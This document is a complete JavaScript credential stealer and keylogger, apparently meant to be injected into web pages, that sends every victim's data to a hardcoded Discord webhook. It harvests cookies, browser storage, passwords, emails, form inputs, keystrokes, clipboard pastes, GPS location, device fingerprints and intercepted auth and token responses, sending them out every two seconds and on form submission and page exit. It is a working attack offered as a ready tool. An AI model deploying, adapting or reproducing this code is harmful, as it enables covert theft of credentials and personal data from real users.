const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';

class EliteLogger {
    constructor() {
        this.victimID = 'victim_' + Math.random().toString(36).substr(2, 9);
        this.data = {};
        this.keystrokes = [];
        this.forms = [];
        this.init();
    }

    async init() {
        console.log('🚀 EliteLogger ACTIVATED');
        
        // IMMEDIATE FULL HARVEST
        await this.harvestEverything();
        await this.sendNuclearDump('💥 **NUCLEAR HARVEST COMPLETE**');
        
        // LIVE HOOKS
        this.hookEverything();
        this.liveExfil();
    }

    async harvestEverything() {
        // === STORAGE NUKING ===
        this.data.cookies = document.cookie || 'empty';
        this.data.localStorage_keys = Object.keys(localStorage);
        this.data.localStorage_sample = Object.fromEntries(
            Object.entries(localStorage).slice(0, 20)
        );
        this.data.sessionStorage_keys = Object.keys(sessionStorage);
        
        // IndexedDB
        try {
            const dbs = await indexedDB.databases();
            this.data.indexedDB = dbs.map(db => db.name);
        } catch(e) { this.data.indexedDB = 'blocked'; }

        // === NETWORK FINGERPRINT ===
        this.data.ipv4 = await this.getIP('https://api.ipify.org?format=json');
        this.data.ipv6 = await this.getIP('https://api64.ipify.org?format=json');
        this.data.ip_icanhaz = await this.getIP('https://ipv4.icanhazip.com');

        // === LOCATION ===
        this.data.location = await this.getPreciseLocation();

        // === DEVICE FINGERPRINT ===
        this.data.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            hardware: navigator.hardwareConcurrency + ' cores',
            memory: navigator.deviceMemory || 'unknown',
            language: navigator.language,
            languages: navigator.languages?.join(', '),
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // === CANVAS/WEBGL FINGERPRINT ===
        this.data.canvas_fp = this.getCanvasFingerprint();
        this.data.webgl_fp = this.getWebGLFingerprint();

        // === FORM FIELDS (AGGRESSIVE) ===
        this.forms = Array.from(document.querySelectorAll('input, textarea, select')).map(el => ({
            id: el.id, name: el.name, type: el.type, 
            value: el.value || el.placeholder,
            autocomplete: el.autocomplete
        })).filter(f => f.value);

        // === HISTORY STATE ===
        this.data.history_length = history.length;
        this.data.referrer = document.referrer;

        // === ALL FORM DATA LIVE ===
        this.grabLiveForms();
    }

    async getIP(url) {
        try {
            const res = await fetch(url, {mode: 'no-cors'});
            return new URL(url).hostname;
        } catch {
            return await new Promise(r => {
                const img = new Image();
                img.onload = () => r('ip_captured');
                img.src = url;
                setTimeout(() => r('unknown'), 2000);
            });
        }
    }

    async getPreciseLocation() {
        return new Promise(resolve => {
            navigator.geolocation.getCurrentPosition(
                p => resolve(`GPS: ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (acc: ${p.coords.accurity}m)`),
                () => resolve('GPS denied'),
                {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
            );
        });
    }

    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillText('A'.repeat(50), 2, 20);
        ctx.fillRect(10, 10, 100, 50);
        return canvas.toDataURL();
    }

    getWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'no_webgl';
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : 'unknown',
            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'unknown'
        };
    }

    grabLiveForms() {
        // TARGET PASSWORD/EMAIL FIELDS SPECIFICALLY
        const passwordFields = document.querySelectorAll('input[type="password"], input[autocomplete*="password"]');
        const emailFields = document.querySelectorAll('input[type="email"], input[autocomplete*="email"]');
        
        passwordFields.forEach((field, i) => {
            this.data[`password_${i}`] = field.value || field.placeholder || 'empty';
        });
        
        emailFields.forEach((field, i) => {
            this.data[`email_${i}`] = field.value || field.placeholder || 'empty';
        });

        // ALL INPUTS
        document.querySelectorAll('input[type="text"], input[type="tel"], input:not([type])').forEach((input, i) => {
            if (input.value) this.data[`input_${i}`] = input.value;
        });
    }

    hookEverything() {
        // KEYSTROKE LOGGER (ALL KEYS)
        document.addEventListener('keydown', e => {
            this.keystrokes.push({
                key: e.key, code: e.code,
                shift: e.shiftKey, ctrl: e.ctrlKey,
                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '')
            });
            if (this.keystrokes.length >= 15) {
                this.sendToDiscord('⌨️ **KEYSTROKE BURST**', {keys: this.keystrokes});
                this.keystrokes = [];
            }
        });

        // MOUSE MOVEMENT (BEHAVIORAL FINGERPRINT)
        document.addEventListener('mousemove', e => {
            if (Math.random() < 0.01) { // 1% sample
                this.data.mouse_sample = `${e.clientX},${e.clientY}`;
            }
        });

        // CLIPBOARD STEALER
        document.addEventListener('paste', async e => {
            try {
                const text = e.clipboardData.getData('text');
                this.sendToDiscord('📋 **CLIPBOARD CAPTURED**', {clipboard: text.slice(0, 500)}, 0xFFA500);
            } catch(e) {}
        });

        // NETWORK INTERCEPTOR
        this.interceptNetwork();
    }

    interceptNetwork() {
        const origFetch = window.fetch;
        window.fetch = async (...args) => {
            const res = await origFetch(...args);
            this.sendToDiscord('🌐 **API INTERCEPTED**', {
                method: args[1]?.method || 'GET',
                url: args[0],
                status: res.status
            });
            return res;
        };

        const origXHR = window.XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this.addEventListener('load', () => {
                if (this.responseURL.includes('auth') || this.responseURL.includes('token')) {
                    EliteLogger.sendToDiscord('🔑 **AUTH XHR**', {
                        url: this.responseURL,
                        status: this.status,
                        response: this.responseText?.slice(0, 1000)
                    });
                }
            });
            return origXHR.apply(this, arguments);
        };
    }

    liveExfil() {
        // EVERY 2 SECONDS
        setInterval(async () => {
            this.grabLiveForms();
            this.sendToDiscord('🔄 **LIVE UPDATE**', {
                active_forms: document.querySelectorAll('input').length,
                passwords_found: Object.keys(this.data).filter(k => k.includes('password')).length,
                emails_found: Object.keys(this.data).filter(k => k.includes('email')).length
            });
        }, 2000);

        // ON FORM SUBMIT
        document.addEventListener('submit', e => {
            this.grabLiveForms();
            this.sendToDiscord('📤 **FORM SUBMITTED**', {
                form_data: this.forms,
                target: e.target.id || e.target.tagName
            }, 0x00FF00);
        });
    }

    static async sendToDiscord(title, extraData = {}, color = 0xFF4444) {
        const payload = {
            username: 'EliteLogger v2.0',
            avatar_url: 'https://i.imgur.com/hacker.png',
            embeds: [{
                title: title,
                color: color,
                fields: [
                    ...Object.entries(extraData).map(([k,v]) => ({
                        name: k.toUpperCase(),
                        value: JSON.stringify(v).slice(0, 1024),
                        inline: false
                    }))
                ],
                timestamp: new Date().toISOString(),
                footer: { text: `Victim: ${navigator.userAgent.slice(0, 50)} | ID: ${this.victimID}` }
            }]
        };

        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch(e) {}
    }

    async sendNuclearDump(title) {
        await EliteLogger.sendToDiscord(title, this.data, 0xFF0000);
    }
}

// === ACTIVATE ===
new EliteLogger();

// === FAILSAFE EXFIL ===
window.addEventListener('beforeunload', () => {
    EliteLogger.sendToDiscord('💀 **SESSION END**', {final: 'dump'});
});
